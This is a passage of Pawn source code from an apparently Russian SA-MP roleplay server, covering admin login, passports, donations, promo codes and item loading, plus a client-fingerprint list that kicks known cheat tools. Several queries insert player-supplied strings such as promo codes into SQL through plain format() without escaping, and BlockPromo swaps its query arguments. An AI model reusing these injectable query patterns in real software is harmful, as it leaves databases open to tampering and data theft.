	Iter_Add(Admins, playerid);

	AdminLogged[playerid] = true;
	new day, month, year;
	getdate(year, month, day);
	mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ADMIN" SET `last_connect` = '%d.%d.%d' WHERE `name` = '%s' LIMIT 1", day, month, year, GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");
	return 1;
}

forward AloginAuth(playerid, inputtext[]);
public AloginAuth(playerid, inputtext[])
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(!rows)
	{
		SendClientMessage(playerid, COLOR_GREY, "Неверный пароль");
		SetPVarInt(playerid, "attempt_pass", GetPVarInt(playerid, "attempt_pass") + 1);
		if(GetPVarInt(playerid, "attempt_pass") > 3)
		{
			DeletePVar(playerid, "attempt_pass");
			SKick(playerid, 2112);
		}
	}
	else
	{
	    new string[144];
		AdminLogged[playerid] = true;
		PI[playerid][pAdmin] = cache_get_row_int(0, 1, dbHandle);
		AdminInfo[playerid][admGoto] = cache_get_row_int(0, 6, dbHandle);
	    AdminInfo[playerid][admGethere] = cache_get_row_int(0, 7, dbHandle);
	    AdminInfo[playerid][admSpectate] = cache_get_row_int(0, 8, dbHandle);
	    AdminInfo[playerid][admTimeMin] = cache_get_row_int(0, 9, dbHandle);
		AdminInfo[playerid][admAlog] = cache_get_row_int(0, 10, dbHandle);

		if(!IsPlayerGrandAdmin(playerid))
		{
            SendClientMessage(playerid, COLOR_GREY, "Вы успешно авторизовались как Администратор");
			if(PI[playerid][pSex] == 1) format(string, sizeof(string), "[A] %s %s[%i] авторизовался", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid);
			else format(string, sizeof(string), "[A] %s %s[%i] авторизовалась", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid);
			SendAdminMessage(COLOR_BLUE, string);
		}

		Iter_Add(Admins, playerid);

		new day, month, year;
  		getdate(year, month, day);
		mysql_format(dbHandle, string, 144, "UPDATE "T_ADMIN" SET `last_connect` = '%d.%d.%d' WHERE `name` = '%s' LIMIT 1", day, month, year, GetName(playerid));
		mysql_tquery(dbHandle, string, "", "");
	}
	return 1;
}

stock IsValidPassport(playerid)
{
    new string[100];
	format(string, sizeof(string), "SELECT `Name` FROM `Passports` WHERE `Name` = '%s' LIMIT 1", GetName(playerid));
	new Cache:result = mysql_query(dbHandle, string);
	new accounts = cache_get_row_count(dbHandle);
	cache_delete(result, dbHandle);
	return accounts;
}

stock OnRegPass(playerid)
{
	new string[250];
	format(string, sizeof(string), "INSERT INTO `Passports` (`Name`,`Seria`,`Number`,`Sex`,`D_Day`,`D_Month`,`D_Year`,`DB_Day`,`DB_Month`,`DB_Year`,`McState`) VALUE ('%s','%d','%d','%d','%d','%d','%d','%d','%d','%d','-1')",
	GetName(playerid),
	PassInfo[playerid][psSeria],
	PassInfo[playerid][psNumber],
	PassInfo[playerid][psSex],
	PassInfo[playerid][psDate][0],
	PassInfo[playerid][psDate][1],
	PassInfo[playerid][psDate][2],
	PassInfo[playerid][psDateBirth][0],
	PassInfo[playerid][psDateBirth][1],
	PassInfo[playerid][psDateBirth][2]);
	mysql_tquery(dbHandle, string, "", "");
	return 1;
}

stock OnLoadPass(playerid)
{
	new string[100];
	format(string, sizeof(string), "SELECT * FROM `Passports` WHERE `Name` = '%s' LIMIT 1", GetName(playerid));
	mysql_tquery(dbHandle, string, "MysqlLoadPassport", "d", playerid);
	return 1;
}

forward MysqlLoadPassport(playerid);
public MysqlLoadPassport(playerid)
{
	if(cache_get_row_count(dbHandle) == 1)
	{
		PassInfo[playerid][psSeria] = cache_get_row_int(0, 1, dbHandle);
		PassInfo[playerid][psNumber] = cache_get_row_int(0, 2, dbHandle);
		PassInfo[playerid][psSex] = cache_get_row_int(0, 3, dbHandle);
		PassInfo[playerid][psDate][0] = cache_get_row_int(0, 4, dbHandle);
		PassInfo[playerid][psDate][1] = cache_get_row_int(0, 5, dbHandle);
		PassInfo[playerid][psDate][2] = cache_get_row_int(0, 6, dbHandle);
		PassInfo[playerid][psDateBirth][0] = cache_get_row_int(0, 7, dbHandle);
		PassInfo[playerid][psDateBirth][1] = cache_get_row_int(0, 8, dbHandle);
		PassInfo[playerid][psDateBirth][2] = cache_get_row_int(0, 9, dbHandle);
		PassInfo[playerid][psCity] = cache_get_row_int(0, 10, dbHandle);
		PassInfo[playerid][mcState] = cache_get_row_int(0, 11, dbHandle);
	}
	return 1;
}

stock GetMonthDays(year, month)
{
	switch(month)
	{
	    case 0:     return 31;
	    case 1: 	return 31;
	    case 2: 	return februarydays(year);
	    case 3: 	return 31;
	    case 4: 	return 30;
	    case 5: 	return 31;
	    case 6: 	return 30;
	    case 7: 	return 31;
	    case 8: 	return 31;
	    case 9: 	return 30;
	    case 10: 	return 31;
	    case 11: 	return 30;
	    case 12: 	return 31;
	    default: 	return -1;
	}
	return -1;
}

stock februarydays(year)
{
	if(!(year % 4)) return 29;
	else return 28;
}

/*stock GetArendCarID(vehicleid, &arend_id = INVALID_PLAYER_ID)
{
    arend_id = INVALID_PLAYER_ID;
	for(new i = 0; i < sizeof(ArendInfo); i++)
	{
	    if(vehicleid == ArendInfo[i][aID])
		{
      		if(IsPlayerConnected(ArendInfo[i][aPlayerID])) arend_id = ArendInfo[i][aPlayerID];
			return i;
		}
 	}
	return -1;
}*/

/*stock GetVehicleArendID(vehicleid)
{
	new playerid = INVALID_PLAYER_ID, get_rent = GetArendCarID(vehicleid, playerid);
    if(get_rent != (-1))
	{
	    if(playerid == INVALID_PLAYER_ID || !IsPlayerConnected(playerid))
	    {
	        ArendInfo[get_rent][aPlayerID] = INVALID_PLAYER_ID;
	        return INVALID_PLAYER_ID;
	    }
	    return ArendInfo[get_rent][aPlayerID];
	}
	return INVALID_PLAYER_ID;
}*/

forward TopCharity(playerid);
public TopCharity(playerid)
{
    new rows, fields, name[MAX_PLAYER_NAME], string[59], string_dialogue[945];
    cache_get_data(rows, fields);
    strcat(string_dialogue, "{FFFF00}Ник игрока\t\t{FFFF00}Пожертвовано\n");
    if(rows < 1) return 1;
    for(new i; i < rows; i++)
    {
        if(cache_get_row_int(i, 52, dbHandle) < 1 || cache_get_row_int(i, 6, dbHandle) >= 10) continue;
        cache_get_row(i, 1, name, dbHandle, MAX_PLAYER_NAME);
        format(string, sizeof(string), "{FFFFFF}%s\t\t{63BD4E}%dр\n", name, cache_get_row_int(i, 52, dbHandle));
        strcat(string_dialogue, string);
    }
    ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Самые щедрые игроки", string_dialogue, "Закрыть", "");
	return 1;
}

/*stock GetFreeSeat(vehicleid)
{
	if(!vehicleid) return -1;
	new model = GetVehicleModel(vehicleid);
	new maxs = GetMaxSeat(model) - 1;
	new bool:seat[3], cnt;
	for(new i = 0, j = MAX_PLAYER(); i <= j; i++)
	{
		if(!IsPlayerConnected(i) || GetPlayerVehicleID(i) != vehicleid) continue;
		new pseat = GetPlayerVehicleSeat(i);
		if(pseat < 1 || pseat > 3) continue;
		seat[pseat-1] = true;
		cnt++;
		if(cnt >= maxs) return -1;
	}
	for(new i; i < 3; i++) if(!seat[i]) return i+1;
	return -1;
}*/

stock CheckPlayerDistanceToVehicle(Float:radi, playerid, vehicleid)
{
	if(!IsPlayerConnected(playerid)) return 0;
	new Float:PX,Float:PY,Float:PZ,Float:X,Float:Y,Float:Z;
	GetPlayerPos(playerid,PX,PY,PZ);
	GetVehiclePos(vehicleid, X,Y,Z);
	new Float:Distance = (X-PX)*(X-PX)+(Y-PY)*(Y-PY)+(Z-PZ)*(Z-PZ);
	if(Distance <= radi*radi) return 1;
	return 0;
}

stock GetMaxSeat(modelid)
{
	switch(modelid)
	{
		case 596..598, 427, 490: return 4;
		case 599, 497, 528: return 2;
	}
	return -1;
}

forward Unfreez2(playerid);
public Unfreez2(playerid)
{
	TogglePlayerControllable(playerid, 1);
	ClearAnimations(playerid);
}

forward TazerOff(playerid);
public TazerOff(playerid)
{
	SetPVarInt(playerid, "Tazer", 0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0, 0);
	TogglePlayerControllable(playerid, 1);
	return 1;
}

forward ClearAnimText(playerid);
public ClearAnimText(playerid) return ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);

forward ClearAnimationsDelay(playerid);
public ClearAnimationsDelay(playerid) ApplyAnimation(playerid, "PED", "IDLE_chat", 4.1, 1, 0, 0, 0, 1, 1);

forward WarningGreenZone(playerid);
public WarningGreenZone(playerid)
{
	DeletePVar(playerid, "SwitchingTextdraw");
	return 1;
}

forward OnPlayerHistoryName(playerid);
public OnPlayerHistoryName(playerid)
{
    if(cache_get_row_count(dbHandle) > 0)
    {
		new string[128];
		new idacca = cache_get_row_int(0, 0, dbHandle);
		format(string, sizeof(string), "SELECT * FROM `historyname` WHERE `idacca` = '%d' ORDER BY `id` DESC LIMIT 10", idacca);
		mysql_tquery(dbHandle, string, "OnPlayerHistoryName2", "d", playerid);
    }
    else SendClientMessage(playerid, COLOR_GREY, "Игрок с таким именем не найден");
	return 1;
}

forward OnPlayerHistoryName2(playerid);
public OnPlayerHistoryName2(playerid)
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
	    new nickname[MAX_PLAYER_NAME], string[350], str[35];
	    for(new i = 0; i < rows; i++)
	    {
			cache_get_row(i, 2, nickname, dbHandle);
	        format(str, sizeof(str), "{FFFFFF}%s\n", nickname);
			strcat(string, str);
	    }
	    ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_LIST, "История ников", string, "Закрыть", "");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Данный игрок ещё не менял имя");
	return 1;
}

/*forward Itter_OPDCInternal_VehicleGun(vehicle_id);
public Itter_OPDCInternal_VehicleGun(vehicle_id)
{
	Iter_Remove(VehicleGun, vehicle_id);
	return 1;
}*/

stock GiveMoney(playerid, amount, description[]="None", bool:game_text=true)
{
	if(playerid == INVALID_PLAYER_ID) return 1;

	PI[playerid][pCash] += amount;
	GivePlayerMoney(playerid, amount);
	MysqlUpdatePlayerInt(playerid, "cash", PI[playerid][pCash]);

	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO money_log (uid,uip,time,money,description) VALUES (%d,'%s',%d,%d,'%s')", PI[playerid][pID], PI[playerid][pIP], gettime(), amount, description);
	mysql_query(dbHandle, STRING_GLOBAL);

	if(game_text && amount != 0)
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s%d rub", amount < 0 ? ("~r~") : ("~g~+"), amount);
		GameTextForPlayer(playerid, STRING_GLOBAL, 4000, 1);
	}

	STRING_GLOBAL[0] = EOS;

	return 1;
}
forward gdonate_callback(playerid);
public gdonate_callback(playerid)
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(!rows) return SendClientMessage(playerid, COLOR_GREY, "На Ваш счёт не поступало пополнений. {FFFF00}Пополнить счёт можно на {FFFFFF}"PAGE_WEBSITE_DONATE"");
	new sum = cache_get_row_int(0, 0, dbHandle);
	new status = cache_get_row_int(0, 1, dbHandle);
	new did = cache_get_row_int(0, 2, dbHandle);
	new string[128];
    if(status == 1)
    {
        PI[playerid][pCredits] += sum;
        PI[playerid][pTotalCredits] += 0;
        format(string, sizeof(string), "На Ваш счёт зачислено %i кредитов. Спасибо за помощь серверу!", sum);
		SendClientMessage(playerid, COLOR_GREEN, string);
		MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
		MysqlUpdatePlayerInt(playerid, "totalcredits", PI[playerid][pCredits]);

		format(string, sizeof(string), "DELETE FROM `gdonate_payments` WHERE `id` = '%d'", did);
		mysql_tquery(dbHandle, string, "", "");
    }
	return 1;
}

stock IsPlayerUseForbiddenSoftware(playerid)
{
	static const forbidden_soft_keys[][43 + 1] =
	{
		"5E1C1837D2C54B24EAAED18C3F96D9EA51A2A481003", // RakSAMP v0.5-0.3c
		"381356A6B4349449E8F818B06B405A4FBBE9F8DDDAB", // RakSAMP v0.5-0.3d
		"354A1F8D95B8384F9C365E2D7418C7EC06CD6EE2928", // RakSAMP v0.5-0.3eR2
		"38E4952825700FE3B8476C3F72D976E7447905BA45D", // BabaShura 2.6/2.7 (0.3e)
		"45525544533450414336385A4E335637584B4F49", // ALEXDRIFT
		"4D374F3753315753544D4E5450354A59414F4746", // SERGEENKO
		"9ED058AA448CD9C4EACD949800A0DC8CFDA4DF99" // MAKAREVICH
	};

	new player_key[64 + 1];

	gpci(playerid, player_key, sizeof(player_key));

	for(new i = 0; i < sizeof(forbidden_soft_keys); i++)
	{
		if(strcmp(player_key, forbidden_soft_keys[i]) == 0)
		{
			return KickEx(playerid, "Forbidden Soft"); // BanEx(playerid,"Cheat");
		}
	}

	return 0;
}

/*forward DataUpdate(playerid);
public DataUpdate(playerid)
{
	if(Phonesmenu[playerid] == 1)
    {
	    new h, m, s, day, month, year;
	    gettime(h, m, s);
	    getdate(year, month, day);
		SetWorldTime(h);
   		new str[100];
		format(str, sizeof(str),"%02d.%02d.%d - %02d:%02d", day, month, year, h, m);
		PlayerTextDrawSetString(playerid,PhonesSA[playerid][0],str);
    }
	return 1;
}*/

forward ShowDPromo(playerid);
public ShowDPromo(playerid)
{
    new rows,fields;
    cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid, -1, "Ошибка: {FFFFFF}действующих промокодов не обнаружено.");
    new code[24],priztext[24],string[100],typepriz,amountpriz,activate;

    STRING_GLOBAL[0] = EOS;
    strcat(STRING_GLOBAL, "{F44607}№:\t{F49E07}Промокод:\t{F4E807}Тип приза:\t{99F407}Количество:\t{4BE8B6}Число активаций:\n");
    for(new i = 0; i < rows; i++)
    {
        cache_get_row(i, 0, code, dbHandle, 24);
		typepriz = cache_get_row_int(i, 5, dbHandle);
		amountpriz = cache_get_row_int(i, 6, dbHandle);
		activate = cache_get_row_int(i, 3, dbHandle);
		switch(typepriz)
		{
		    case 1: priztext = "VIP аккаунт", format(string,sizeof string, "%dдней",amountpriz);
		    case 2: priztext = "Игр. валюта", format(string,sizeof string, "%dруб.",amountpriz);
		    case 3: priztext = "Кредиты", format(string,sizeof string, "%dкред.",amountpriz);
		}
        format(string,sizeof(string),"{F44607}%d  \t{F49E07}%s  \t{F4E807}%s  \t{99F407}%s  \t{4BE8B6}%d\n", i+1, code, priztext,string, activate);
        strcat(STRING_GLOBAL, string);
	}
    ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_LIST,"{ECF003}Список действующих промокодов", STRING_GLOBAL, "Закрыть", "");
    return 1;
}
forward ShowAPromo(playerid);
public ShowAPromo(playerid)
{
    new rows,fields;
    cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid, -1, "Ошибка: {FFFFFF}активированных промокодов не обнаружено.");
    new code[24],priztext[24],data[32],string[128],typepriz,amountpriz;

    STRING_GLOBAL[0] = EOS;
    strcat(STRING_GLOBAL, "{F44607}№:\t{F49E07}Промокод:\t{F4E807}Тип приза:\t{99F407}Количество:\t{4BE8B6}Активирован:\n");
    for(new i; i < rows; i++)
    {
        cache_get_row(i, 0, code, dbHandle, 24);
		typepriz = cache_get_row_int(i, 5, dbHandle);
		amountpriz = cache_get_row_int(i, 6, dbHandle);
		cache_get_row(i, 4, data, dbHandle, 32);
		switch(typepriz)
		{
		    case 1: priztext = "VIP аккаунт", format(string,sizeof string, "%dдней",amountpriz);
		    case 2: priztext = "Игр. валюта", format(string,sizeof string, "%dруб.",amountpriz);
		    case 3: priztext = "Кредиты", format(string,sizeof string, "%dкред.",amountpriz);
		}
        format(string,sizeof(string),"{F44607}%d  \t{F49E07}%s  \t{F4E807}%s  \t{99F407}%s  \t{4BE8B6}%s\n", i+1, code, priztext,string, data);
        strcat(STRING_GLOBAL, string);
    }
    ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_LIST,"{ECF003}Список активированных промокодов", STRING_GLOBAL, "Закрыть", "");
    return 1;
}
forward ShowBPromo(playerid);
public ShowBPromo(playerid)
{
    new rows,fields;
    cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid, -1, "Ошибка: {FFFFFF}заблокированных промокодов не обнаружено.");
    new code[24],priztext[24],data[32],string[100],typepriz,amountpriz;

    STRING_GLOBAL[0] = EOS;
    strcat(STRING_GLOBAL, "{F44607}№:\t{F49E07}Промокод:\t{F4E807}Тип приза:\t{99F407}Количество:\t{4BE8B6}Заблокирован:\n");
    for(new i; i < rows; i++)
    {
        cache_get_row(i, 0, code, dbHandle, 24);
		typepriz = cache_get_row_int(i, 5, dbHandle);
		amountpriz = cache_get_row_int(i, 6, dbHandle);
		cache_get_row(i, 4, data, dbHandle, 32);
		switch(typepriz)
		{
		    case 1: priztext = "VIP аккаунт", format(string,sizeof string, "%dдней",amountpriz);
		    case 2: priztext = "Игр. валюта", format(string,sizeof string, "%dруб.",amountpriz);
		    case 3: priztext = "Кредиты", format(string,sizeof string, "%dкред.",amountpriz);
		}
        format(string,sizeof(string),"{F44607}%d  \t{F49E07}%s  \t{F4E807}%s  \t{99F407}%s  \t{4BE8B6}%s\n", i+1, code, priztext,string, data);
        strcat(STRING_GLOBAL, string);
    }
    ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_LIST,"{FE6060}Список заблокированных промокодов", STRING_GLOBAL, "Закрыть", "");
    return 1;
}
forward CreatePromo(playerid,code[]);
public CreatePromo(playerid,code[])
{
    new rows,fields,string[256],typetext[34], typetext1[10];
    cache_get_data(rows, fields);
    if(rows) return SendClientMessage(playerid,COLOR_ORANGE,"Промокод уже имеется в базе данных. Придумайте другой..");
	new type = GetPVarInt(playerid,"TYPEPROMO");
	switch(type)
	{
	    case 1: typetext = "VIP аккаунт, на", typetext1 = " дней";
	    case 2: typetext = "валюту, в размере:", typetext1 = "руб.";
	    case 3: typetext = "кредиты, в размере:", typetext1 = "кр.";
	}
	new amount = GetPVarInt(playerid,"AMOUNTPROMO");
	new totalactivate = GetPVarInt(playerid,"ACTIVATEPROMO");
    format(string,sizeof(string),"INSERT INTO `promo` (`name`,`typepriz`,`amountpriz`,`nactivations`) VALUES ('%s','%d','%d','%d')",code,type,amount,totalactivate);
   	mysql_function_query(dbHandle, string, false, "", "");

	for(new i; i < sizeof TDEditor_PROMO; i ++) TextDrawShowForPlayer(playerid, TDEditor_PROMO[i]);

	format(string, sizeof string, "код_активации:_~g~~h~~h~\"_%s_\"~n~~n~~w~промокод_содержит:_~b~~h~~h~%s %d%s", code, typetext, amount, typetext1);
	TextDrawSetString(TDEditor_PROMO[4], string);

	format(string, sizeof string, "количество_активаций:_~b~~h~~h~%d", totalactivate);
	TextDrawSetString(TDEditor_PROMO[5], string);

	SelectTextDraw(playerid, 0x009900FF);

	SetPVarInt(playerid, "send_promo", 1);

    return DeletePVar(playerid,"TYPEPROMO"),DeletePVar(playerid,"AMOUNTPROMO"),DeletePVar(playerid,"ACTIVATEPROMO"),DeletePVar(playerid,"PROMO");
}
forward DeletePromo(playerid,code[]);
public DeletePromo(playerid,code[])
{
    new rows,fields;
    cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid,-1,"Ошибка: {FFFFFF}промокода не существует.");

	STRING_GLOBAL[0] = EOS;
    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "DELETE FROM promo WHERE name = '%s'", code);
   	mysql_function_query(dbHandle, STRING_GLOBAL, false, "", "");

   	STRING_GLOBAL[0] = EOS;
    format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"{FFFFFF}Промокод {65A0D0}'%s' {FFFFFF}успешно удалён.",code);
    SendClientMessage(playerid,-1, STRING_GLOBAL);
    return 1;
}
forward BlockPromo(playerid,code[]);
public BlockPromo(playerid,code[])
{
    new rows,fields;
    cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid,-1,"Ошибка: {FFFFFF}промокода не существует.");
	new string[256];
	new hourss,minn,secc;
	gettime(hourss,minn,secc);
	format(string,100,"%s / %02d:%02d:%02d",date("%dd.%mm.%yyyy",gettime()),hourss,minn,secc);
    format(string, sizeof(string), "UPDATE promo SET `block`='1',`date`='%s' WHERE name='%s'", code, string);
   	mysql_function_query(dbHandle, string, false, "", "");
    format(string,sizeof(string),"{FFFFFF}Промокод {65A0D0}'%s' {FFFFFF}успешно заблокирован.",code);
    SendClientMessage(playerid,-1,string);
    return 1;
}
forward CheckPromo(playerid);
public CheckPromo(playerid)
{
    new rows,fields;
    cache_get_data(rows, fields);
	if(rows) return SendClientMessage(playerid,-1,"Ошибка: {FFFFFF}Вы уже активировали промокод, и не можете сделать это повторно.");
	//new accid;
	//accid = cache_get_row_int(0, 0, dbHandle);
    //if(accid == PI[playerid][pID]) return SendClientMessage(playerid,-1,"{FE0000}Ошибка: {FFFFFF}Вы уже активировали этот промокод, повторная активация невозможна.");
    new qstring[128],code[16];
    GetPVarString(playerid,"CODE",code,sizeof(code));
	mysql_format(dbHandle, qstring, sizeof(qstring), "SELECT * FROM `promo` WHERE `name`='%s'", code);
 	mysql_tquery(dbHandle, qstring, "ActivatePromo", "is", playerid, code);
	return 1;
}

forward ActivatePromo(playerid,code[]);
public ActivatePromo(playerid,code[])
{
    new rows,fields;
    cache_get_data(rows, fields);
    if(!rows) return SendClientMessage(playerid,-1,"{FE0000}Ошибка: {FFFFFF}промокода не существует.");
	new typepriz,amountpriz,nactivations,string[512],activate,block,data[24],typetext[34],typetext1[24];
	new year, month, day;
	new current_date = getdate(year, month, day);
    for(new i; i < rows; i++)
    {
		typepriz = cache_get_row_int(i, 5, dbHandle);
		amountpriz = cache_get_row_int(i, 6, dbHandle);
		nactivations = cache_get_row_int(i, 3, dbHandle);
		activate = cache_get_row_int(i, 1, dbHandle);
		block = cache_get_row_int(i, 2, dbHandle);
		cache_get_row(i, 4, data, dbHandle, 24);
		switch(typepriz)
		{
		    case 1: typetext = "VIP аккаунт на",typetext1 = "дней";
	    	case 2: typetext = "Игровая валюта в количестве",typetext1 = "руб";
	   	 	case 3: typetext = "Кредиты в количестве",typetext1 = "кр.";
		}
	}
	if(block > 0) return SendClientMessage(playerid,-1,"{FFFFFF}промокод заблокирован.");
	if(PI[playerid][pLevel] < 5) return SendClientMessage(playerid,-1,"{FFFFFF}Активировать промокод можно с 5 LVL.");
	if(activate != 0)
	{
	    format(string,sizeof(string),"{FFFFFF}Промокод '%s' {FFFFFF}уже активирован {65A0D0}%s\n{FFFFFF}К сожалению, Вы опоздали. Но ничего, получится в другой раз..",code,data);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"{FE0000}Ошибка",string,"Закрыть","");
		return true;
	}
	format(string,sizeof(string),"INSERT INTO `promo_activations` (`account_id`,`name_promo`) VALUES ('%d','%s')",PI[playerid][pID],code);
   	mysql_function_query(dbHandle, string, false, "", "");
	SendClientMessage(playerid,COLOR_ORANGE,"Поздравляем! Вы активировали промокод!");
	switch(typepriz)
	{
	    case 1: PI[playerid][pVip] = 1,PI[playerid][pVipTime] = current_date + amountpriz, MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]), MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
    	case 2: GiveMoney(playerid, amountpriz);
   	 	case 3: PI[playerid][pCredits] += amountpriz, MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
	}
	format(string,sizeof(string),"Промокод содержал: %s %d%s",typetext,amountpriz,typetext1),SendClientMessage(playerid,COLOR_ORANGE,string);
	nactivations--;
	format(string, sizeof(string), "UPDATE promo SET `nactivations`='%d' WHERE name='%s'", nactivations, code);
	mysql_function_query(dbHandle, string, false, "", "");
	if(nactivations == 0)
	{
	    new hourss,minn,secc;
		gettime(hourss,minn,secc);
		format(string,100,"%s / %02d:%02d:%02d",date("%dd.%mm.%yyyy",gettime()),hourss,minn,secc);
	    format(string, sizeof(string), "UPDATE promo SET `activate`='1',`date`='%s' WHERE name='%s'", string,code);
   		mysql_function_query(dbHandle, string, false, "", "");
   		return true;
	}
	DeletePVar(playerid,"CODE");
    return 1;
}

stock VehNumber()
{
  	new rand; rand = random(12);
  	new chr[20];
  	switch(rand)
  	{
    	case 0: format(chr,20,"%s","а");
    	case 1: format(chr,20,"%s","в");
    	case 2: format(chr,20,"%s","е");
	    case 3: format(chr,20,"%s","к");
	    case 4: format(chr,20,"%s","м");
	    case 5: format(chr,20,"%s","н");
	    case 6: format(chr,20,"%s","о");
	    case 7: format(chr,20,"%s","р");
	    case 8: format(chr,20,"%s","с");
	    case 9: format(chr,20,"%s","т");
	    case 10: format(chr,20,"%s","у");
	    case 11: format(chr,20,"%s","х");
  	}
  	return chr;
}

stock VehNumber_ua()
{
  	new rand; rand = random(12);
  	new chr[20];
  	switch(rand)
  	{
    	case 0: format(chr,20,"%s","а");
    	case 1: format(chr,20,"%s","в");
    	case 2: format(chr,20,"%s","с");
	    case 3: format(chr,20,"%s","е");
	    case 4: format(chr,20,"%s","н");
	    case 5: format(chr,20,"%s","м");
	    case 6: format(chr,20,"%s","о");
	    case 7: format(chr,20,"%s","р");
	    case 8: format(chr,20,"%s","т");
	    case 9: format(chr,20,"%s","i");
	    case 10: format(chr,20,"%s","к");
	    case 11: format(chr,20,"%s","х");
  	}
  	return chr;
}

stock VehNumber_kz()
{
  	new rand; rand = random(12);
  	new chr[20];
  	switch(rand)
  	{
    	case 0: format(chr,20,"%s","а");
    	case 1: format(chr,20,"%s","в");
    	case 2: format(chr,20,"%s","е");
	    case 3: format(chr,20,"%s","к");
	    case 4: format(chr,20,"%s","м");
	    case 5: format(chr,20,"%s","н");
	    case 6: format(chr,20,"%s","о");
	    case 7: format(chr,20,"%s","р");
	    case 8: format(chr,20,"%s","с");
	    case 9: format(chr,20,"%s","т");
	    case 10: format(chr,20,"%s","i");
	    case 11: format(chr,20,"%s","х");
  	}
  	return chr;
}

stock VehNumber_by()
{
  	new rand; rand = random(12);
  	new chr[20];
  	switch(rand)
  	{
    	case 0: format(chr,20,"%s","а");
    	case 1: format(chr,20,"%s","в");
    	case 2: format(chr,20,"%s","е");
	    case 3: format(chr,20,"%s","к");
	    case 4: format(chr,20,"%s","м");
	    case 5: format(chr,20,"%s","н");
	    case 6: format(chr,20,"%s","о");
	    case 7: format(chr,20,"%s","р");
	    case 8: format(chr,20,"%s","с");
	    case 9: format(chr,20,"%s","т");
	    case 10: format(chr,20,"%s","i");
	    case 11: format(chr,20,"%s","х");
  	}
  	return chr;
}

stock CancelFlyMode(playerid)
{
	DeletePVar(playerid, "FlyMode");
	CancelEdit(playerid);
	TogglePlayerSpectating(playerid, false);
	TogglePlayerSpectating(playerid, 0);

	DestroyPlayerObject(playerid, noclipdata[playerid][flyobject]);
	noclipdata[playerid][cameramode] = CAMERA_MODE_NONE;
	return 1;
}

stock FlyMode(playerid)
{
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	noclipdata[playerid][flyobject] = CreatePlayerObject(playerid, 19300, X, Y, Z, 0.0, 0.0, 0.0);

	TogglePlayerSpectating(playerid, true);
	AttachCameraToPlayerObject(playerid, noclipdata[playerid][flyobject]);

	SetPVarInt(playerid, "FlyMode", 1);
	noclipdata[playerid][cameramode] = CAMERA_MODE_FLY;
	return 1;
}

forward LoadDropItem();
public LoadDropItem()
{
    new time = GetTickCount();
    new vresult[15],rows,fields,id;
    cache_get_data(rows,fields);
    if(rows)
    {
        while(--rows>=0)
        {
            id++;
            new num=0,v[32];
            cache_get_field_content(rows,"Number",vresult), num = strval(vresult);
            DropItem[num][dNumber]=num;
            cache_get_field_content(rows,"X",vresult), DropItem[num][dX] = floatstr(vresult);
            cache_get_field_content(rows,"Y",vresult), DropItem[num][dY] = floatstr(vresult);
            cache_get_field_content(rows,"Z",vresult), DropItem[num][dZ] = floatstr(vresult);
            cache_get_field_content(rows,"IDItem",vresult), DropItem[num][dIDItem] = strval(vresult);
            cache_get_field_content(rows,"Piece",vresult), DropItem[num][dPiece] = strval(vresult);
            cache_get_field_content(rows,"Int",vresult), DropItem[num][dInt] = strval(vresult);
            cache_get_field_content(rows,"World",vresult), DropItem[num][dWorld] = strval(vresult);
			cache_get_field_content(0, "Value",v);
			format(DropItem[num][dValue],32,"%s",v);
            if(DropItem[num][dIDItem]==213&&DropItem[num][dPiece]>1)
			{
				DropItem[num][dPiece]=1;
			}
            new model,Float:pdz[4];
			switch(DropItem[num][dIDItem])
			{
				case 1:{model=331;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 2:{model=333;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 3:{model=334;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 4:{model=335;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 5:{model=336;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 6:{model=337;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 7:{model=338;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 8:{model=339;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 9:{model=341;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
				case 10:{model=321;pdz[0]=-0.95;pdz[1]=93.7;pdz[2]=120.0;pdz[3]=120.0;}
